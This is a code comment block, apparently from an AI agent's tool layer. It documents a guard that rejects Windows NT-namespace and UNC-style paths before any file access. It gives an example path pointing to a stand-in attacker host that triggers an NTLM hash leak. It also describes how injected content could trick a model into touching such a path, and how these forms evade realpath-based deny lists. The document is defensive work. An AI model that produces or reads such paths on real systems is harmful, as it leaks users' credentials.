# Windows NT-namespace path guard
#
# Pre-approval file accesses reject Windows NT-namespace (``\??\``) paths so
# the remaining unguarded path touches cannot be turned into an NTLM
# credential leak.
#
# The vector: on Windows, merely *resolving or touching* a path such as
# ``\\??\\UNC\\attacker.example\\share\\x`` (or the ``\\\\?\\UNC\\`` /
# ``GLOBALROOT`` re-entry forms) makes the OS initiate SMB authentication to
# the remote host, leaking the user's NTLM hash — even when the read itself
# fails or would later be denied. NT object-namespace paths also bypass
# normal Win32 path normalization, which lets them dodge deny-prefix checks
# built on ``realpath()`` string comparison. A model tricked by injected
# content into "reading" such a path leaks credentials before any denylist
# built on resolved paths can fire.
#
# Consequently this check MUST run on the *raw* path string before any
# ``Path.resolve()`` / ``os.path.realpath()`` call, and it does — it is the
# first check in both :func:`get_read_block_error` and the write-denial
# classifier.
#
# Scope (deliberately narrow to avoid false positives):
#   * ``\\??\\...``            — NT object-namespace paths. Never legitimate
#                                tool input on any platform.
#   * ``\\\\.\\...``           — Win32 device namespace (``\\\\.\\pipe\\``,
#                                ``\\\\.\\PhysicalDrive0``, ...). Not a file
#                                read/write target for agent tools.
#   * ``\\\\?\\UNC\\...``      — extended-length UNC form (remote host).
#   * ``\\\\?\\GLOBALROOT...`` — re-entry into the NT namespace.
#
# Plain drive-letter extended-length paths (``\\\\?\\C:\\...``) stay ALLOWED:
# they are a routine local form (see hermes_cli/windows_ssh_runtime.py) and
# carry no remote-auth trigger. Plain UNC shares (``\\\\server\\share``) are
# also unchanged here — blocking ordinary UNC reads is a policy question,
# not part of this namespace-bypass guard.
#
# The guard runs on every platform: these prefixes are never legitimate
# inputs on POSIX either, and path strings can be relayed toward Windows
# hosts (remote terminal backends, desktop bridges).
